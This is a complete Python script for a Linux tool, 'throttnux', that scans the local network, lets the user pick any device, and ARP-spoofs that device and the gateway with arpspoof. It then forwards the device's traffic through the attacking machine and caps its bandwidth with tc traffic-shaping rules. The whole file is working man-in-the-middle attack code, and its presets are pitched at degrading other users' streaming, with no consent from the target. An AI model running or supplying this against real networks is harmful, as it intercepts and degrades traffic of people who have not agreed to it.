#!/usr/bin/env python3
"""
throttnux — v2.2.0
Per-device bandwidth limiter via ARP spoofing + Linux traffic shaping.

Requirements:
    sudo dnf install dsniff arp-scan python3-psutil   # Fedora/RHEL
    sudo apt install dsniff arp-scan python3-psutil   # Debian/Ubuntu
    sudo pacman -S dsniff arp-scan python-psutil      # Arch Linux

Usage:
    sudo python3 main.py
"""

import subprocess
import threading
import time
import sys
import signal
import os
import re
import atexit
import logging

try:
    import psutil
except ImportError:
    print("[ERROR] psutil is not installed.")
    print("        Fedora/RHEL : sudo dnf install python3-psutil")
    print("        Debian/Ubuntu: sudo apt install python3-psutil")
    print("        Arch Linux  : sudo pacman -S python-psutil")
    sys.exit(1)

# ────────────────────────────────────────────────────────────────
VERSION    = "2.2.0"
stop_event = threading.Event()
TARGET_IP  = None
TARGET_MAC = None
LIMIT_MBPS = None
INTERFACE  = None
ROUTER_IP  = None
# ────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("throttnux")


# ─── HELPERS ────────────────────────────────────────────────────

def run(cmd, check=True):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if check and result.returncode != 0:
        log.error(f"Command failed: {cmd}\n{result.stderr.strip()}")
    return result


def banner():
    print("""
Welcome to Throttnux
Per-device bandwidth limiter via ARP spoofing
""")


def prompt(text, valid_range=None):
    """Generic prompt with optional range validation."""
    while True:
        try:
            choice = input(text).strip()
            if valid_range is not None:
                idx = int(choice) - 1
                if 0 <= idx < valid_range:
                    return idx
                print(f"  [!] Enter a number between 1 and {valid_range}")
            else:
                return choice
        except ValueError:
            print("  [!] Invalid input.")
        except KeyboardInterrupt:
            print("\n  Cancelled.")
            sys.exit(0)


# ─── INTERFACE & ROUTER DETECTION ───────────────────────────────

def get_active_interfaces():
    """
    Return list of active non-loopback interfaces with an assigned IP,
    using psutil — works across all Linux distros.
    """
    interfaces = []
    stats = psutil.net_if_stats()
    addrs = psutil.net_if_addrs()

    for iface, stat in stats.items():
        if iface == "lo":
            continue
        if not stat.isup:
            continue
        if iface not in addrs:
            continue

        ipv4 = [
            a.address for a in addrs[iface]
            if a.family.name == "AF_INET"
        ]
        if not ipv4:
            continue

        interfaces.append({
            "name":  iface,
            "ip":    ipv4[0],
            "speed": f"{stat.speed} Mbps" if stat.speed > 0 else "unknown speed"
        })

    return interfaces


def get_gateways():
    """
    Detect available gateways from the system routing table.
    Returns list of gateway IPs associated with each interface.
    """
    gateways = []
    result = run("ip route show", check=False)

    for line in result.stdout.splitlines():
        match = re.match(r"default via (\S+) dev (\S+)", line)
        if match:
            gw_ip, iface = match.groups()
            gateways.append({"ip": gw_ip, "interface": iface})

    return gateways


def pick_interface():
    """Interactive interface picker."""
    interfaces = get_active_interfaces()

    if not interfaces:
        log.error("No active network interfaces found.")
        sys.exit(1)

    if len(interfaces) == 1:
        iface = interfaces[0]
        log.info(f"Auto-selected interface: {iface['name']} ({iface['ip']})")
        return iface["name"]

    print("=" * 55)
    print("  Available network interfaces:")
    print("=" * 55)
    print(f"  {'No':<5} {'Interface':<14} {'IP Address':<18} {'Speed'}")
    print("  " + "-" * 50)

    for i, iface in enumerate(interfaces, 1):
        print(f"  {i:<5} {iface['name']:<14} {iface['ip']:<18} {iface['speed']}")

    print("=" * 55)

    idx      = prompt("\n  Select interface number: ", valid_range=len(interfaces))
    selected = interfaces[idx]
    log.info(f"Selected interface: {selected['name']} ({selected['ip']})")
    return selected["name"]


def pick_router(interface):
    """Interactive router/gateway picker, filtered by selected interface."""
    gateways  = get_gateways()
    matched   = [g for g in gateways if g["interface"] == interface]
    candidates = matched if matched else gateways

    if not candidates:
        log.error("No gateway detected. Make sure you are connected to a network.")
        sys.exit(1)

    if len(candidates) == 1:
        gw = candidates[0]["ip"]
        log.info(f"Auto-selected gateway: {gw}")
        return gw

    print("\n" + "=" * 55)
    print("  Available gateways (routers):")
    print("=" * 55)
    print(f"  {'No':<5} {'Gateway IP':<18} {'Interface'}")
    print("  " + "-" * 40)

    for i, gw in enumerate(candidates, 1):
        print(f"  {i:<5} {gw['ip']:<18} {gw['interface']}")

    print("=" * 55)

    idx      = prompt("\n  Select gateway number: ", valid_range=len(candidates))
    selected = candidates[idx]["ip"]
    log.info(f"Selected gateway: {selected}")
    return selected


# ─── DEVICE SCANNING ────────────────────────────────────────────

def scan_devices():
    """Scan all active devices on the local network using arp-scan."""
    log.info("Scanning network for active devices...")
    result = run(f"arp-scan --localnet -I {INTERFACE}", check=False)

    devices = []
    for line in result.stdout.splitlines():
        match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([\w:]+)\s*(.*)", line)
        if match:
            ip, mac, vendor = match.groups()
            if ip == ROUTER_IP:
                continue
            devices.append({
                "ip":     ip,
                "mac":    mac.lower(),
                "vendor": vendor.strip() if vendor.strip() else "Unknown"
            })

    return devices


def pick_target(devices):
    """Display device list and prompt user to pick a target."""
    if not devices:
        log.error("No devices found on the network.")
        sys.exit(1)

    print("\n" + "=" * 58)
    print("  Devices detected on the network:")
    print("=" * 58)
    print(f"  {'No':<5} {'IP':<16} {'MAC':<20} {'Vendor'}")
    print("  " + "-" * 53)

    for i, dev in enumerate(devices, 1):
        print(f"  {i:<5} {dev['ip']:<16} {dev['mac']:<20} {dev['vendor'][:22]}")

    print("=" * 58)

    idx = prompt("\n  Select device number to throttle: ", valid_range=len(devices))
    return devices[idx]


def pick_limit():
    """Prompt user to select a bandwidth limit."""
    print("\n  Select bandwidth limit:")
    print("  [1] 1 Mbps  — heavy buffering, no HD YouTube")
    print("  [2] 2 Mbps  — stuck at 480p")
    print("  [3] 3 Mbps  — occasional buffering at 720p")
    print("  [4] Custom")

    presets = {"1": 1.0, "2": 2.0, "3": 3.0}

    while True:
        try:
            choice = input("\n  Choice (1-4): ").strip()
            if choice in presets:
                return presets[choice]
            elif choice == "4":
                val = float(input("  Enter limit in Mbps: ").strip())
                if val <= 0:
                    print("  [!] Limit must be greater than 0.")
                    continue
                return val
            else:
                print("  [!] Please choose 1-4.")
        except ValueError:
            print("  [!] Invalid input.")
        except KeyboardInterrupt:
            print("\n  Cancelled.")
            sys.exit(0)


# ─── TRAFFIC SHAPING ────────────────────────────────────────────

def enable_ip_forward():
    log.info("Enabling IP forwarding...")
    run("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forward():
    log.info("Disabling IP forwarding...")
    run("echo 0 > /proc/sys/net/ipv4/ip_forward")


def setup_traffic_shaping():
    log.info(f"Setting up traffic shaping → {LIMIT_MBPS} Mbps limit for {TARGET_IP}")
    limit_kbit = int(LIMIT_MBPS * 1000)

    run(f"tc qdisc del dev {INTERFACE} root", check=False)

    cmds = [
        f"tc qdisc add dev {INTERFACE} root handle 1: htb default 99",
        f"tc class add dev {INTERFACE} parent 1: classid 1:99 htb rate 1000mbit",
        f"tc class add dev {INTERFACE} parent 1: classid 1:10 htb rate {limit_kbit}kbit burst 10k",
        f"tc filter add dev {INTERFACE} parent 1: protocol ip prio 1 u32 match ip dst {TARGET_IP}/32 flowid 1:10",
        f"tc filter add dev {INTERFACE} parent 1: protocol ip prio 2 u32 match ip src {TARGET_IP}/32 flowid 1:10",
    ]

    for cmd in cmds:
        run(cmd)

    log.info(f"Traffic shaping active → target limited to {LIMIT_MBPS} Mbps")


def cleanup_traffic_shaping():
    log.info("Removing traffic shaping rules...")
    run(f"tc qdisc del dev {INTERFACE} root", check=False)


# ─── ARP SPOOFING ───────────────────────────────────────────────

def arp_spoof_loop():
    log.info("Starting ARP spoofing...")

    proc_target = subprocess.Popen(
        f"arpspoof -i {INTERFACE} -t {TARGET_IP} {ROUTER_IP}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    proc_router = subprocess.Popen(
        f"arpspoof -i {INTERFACE} -t {ROUTER_IP} {TARGET_IP}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    log.info(f"ARP spoofing active → traffic from {TARGET_IP} routed through this machine")
    stop_event.wait()

    log.info("Stopping ARP spoofing...")
    proc_target.terminate()
    proc_router.terminate()
    proc_target.wait()
    proc_router.wait()


# ─── MONITORING ─────────────────────────────────────────────────

def get_tc_stats():
    """
    Read tc class 1:10 stats.
    Returns (bytes_sent, pkts_sent, pkts_overlimit) or None if unavailable.
    """
    result = run(f"tc -s class show dev {INTERFACE}", check=False)
    lines  = result.stdout.splitlines()

    for i, line in enumerate(lines):
        if "1:10" in line:
            for j in range(i + 1, min(i + 4, len(lines))):
                m = re.search(r"Sent (\d+) bytes (\d+) pkt.*overlimits (\d+)", lines[j])
                if m:
                    return int(m.group(1)), int(m.group(2)), int(m.group(3))
    return None


def format_bytes(b):
    """Convert bytes to human-readable string."""
    if b < 1024:
        return f"{b} B"
    elif b < 1024 ** 2:
        return f"{b / 1024:.1f} KB"
    elif b < 1024 ** 3:
        return f"{b / 1024 ** 2:.1f} MB"
    return f"{b / 1024 ** 3:.2f} GB"


def verify_spoofing():
    """Auto-verify whether spoofing successfully captured target traffic."""
    log.info("Verifying spoofing status (waiting 5 seconds)...")
    time.sleep(5)

    stats = get_tc_stats()
    if stats:
        _, pkts, _ = stats
        if pkts > 0:
            log.info(f"Spoofing SUCCESSFUL — {pkts} packets captured from target")
        else:
            log.warning("Spoofing may have FAILED — no traffic captured yet")
            log.warning("Make sure the target device is actively using the internet")


def live_monitor():
    """
    Realtime bandwidth monitor — updates in-place every second.
    Shows current Mbps, status indicator, total data throttled, and uptime.

    Status indicator:
      ● — throttling active (overlimit packets detected)
      ○ — idle or spoofing not yet effective
    """
    # Wait for verify_spoofing to finish first
    time.sleep(6)

    start_time = time.time()
    prev_bytes = 0
    prev_time  = time.time()

    print()

    while not stop_event.is_set():
        stats = get_tc_stats()

        if stats:
            total_bytes, _, overlimits = stats
            now         = time.time()
            elapsed     = now - prev_time
            delta_bytes = max(0, total_bytes - prev_bytes)
            mbps        = (delta_bytes * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
            uptime      = int(now - start_time)
            uptime_str  = f"{uptime // 3600:02d}:{(uptime % 3600) // 60:02d}:{uptime % 60:02d}"
            total_str   = format_bytes(total_bytes)
            status      = "●" if overlimits > 0 else "○"

            line = (
                f"\r[LIVE {status}] {TARGET_IP} → "
                f"{mbps:.2f} Mbps / {LIMIT_MBPS} Mbps limit | "
                f"{total_str} throttled | "
                f"Uptime: {uptime_str}   "
            )
            sys.stdout.write(line)
            sys.stdout.flush()

            prev_bytes = total_bytes
            prev_time  = now

        time.sleep(1)

    # Clear the live line on exit
    sys.stdout.write("\r" + " " * 80 + "\r")
    sys.stdout.flush()


# ─── CLEANUP ────────────────────────────────────────────────────

def emergency_cleanup():
    """Fallback cleanup on unexpected exit."""
    cleanup_traffic_shaping()
    disable_ip_forward()


def signal_handler(sig, frame):
    print()
    log.info("Interrupt received. Cleaning up...")
    stop_event.set()


# ─── CHECKS ─────────────────────────────────────────────────────

def check_root():
    if os.geteuid() != 0:
        log.error("This script must be run as root.")
        log.error("Try: sudo python3 main.py")
        sys.exit(1)


def check_os():
    if sys.platform != "linux":
        log.error("Throttnux only supports Linux.")
        log.error("Windows and macOS are not supported.")
        sys.exit(1)


def check_dependencies():
    missing = []
    for tool in ["arpspoof", "tc", "arp-scan"]:
        if run(f"which {tool}", check=False).returncode != 0:
            missing.append(tool)

    if missing:
        log.error(f"Missing required tools: {', '.join(missing)}")
        log.error("Fedora/RHEL  : sudo dnf install dsniff arp-scan")
        log.error("Debian/Ubuntu: sudo apt install dsniff arp-scan")
        sys.exit(1)


# ─── MAIN ───────────────────────────────────────────────────────

def main():
    global TARGET_IP, TARGET_MAC, LIMIT_MBPS, INTERFACE, ROUTER_IP

    check_os()
    check_root()
    check_dependencies()

    banner()

    # 1. Auto-detect interface and router interactively
    INTERFACE = pick_interface()
    ROUTER_IP = pick_router(INTERFACE)

    # 2. Scan and pick target device
    devices    = scan_devices()
    target     = pick_target(devices)
    TARGET_IP  = target["ip"]
    TARGET_MAC = target["mac"]

    # 3. Pick bandwidth limit
    LIMIT_MBPS = pick_limit()

    # 4. Confirm
    print("\n" + "=" * 58)
    print(f"  Target    : {TARGET_IP} ({TARGET_MAC})")
    print(f"  Vendor    : {target['vendor']}")
    print(f"  Limit     : {LIMIT_MBPS} Mbps")
    print(f"  Interface : {INTERFACE}")
    print(f"  Router    : {ROUTER_IP}")
    print("=" * 58)

    try:
        if input("\n  Proceed? (y/n): ").strip().lower() != "y":
            print("  Cancelled.")
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)

    print()

    # 5. Register cleanup handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    atexit.register(emergency_cleanup)

    # 6. Setup
    enable_ip_forward()
    setup_traffic_shaping()

    # 7. ARP spoofing in background thread
    spoof_thread = threading.Thread(target=arp_spoof_loop, daemon=True)
    spoof_thread.start()

    # 8. Verify spoofing in background thread
    verify_thread = threading.Thread(target=verify_spoofing, daemon=True)
    verify_thread.start()

    # 9. Realtime monitor in background thread
    monitor_thread = threading.Thread(target=live_monitor, daemon=True)
    monitor_thread.start()

    log.info("Running. Press Ctrl+C to stop and restore target connection.")

    # 10. Wait for stop signal
    stop_event.wait()

    # 11. Cleanup
    spoof_thread.join(timeout=5)
    cleanup_traffic_shaping()
    disable_ip_forward()

    log.info("Done. Target connection restored.")


if __name__ == "__main__":
    main()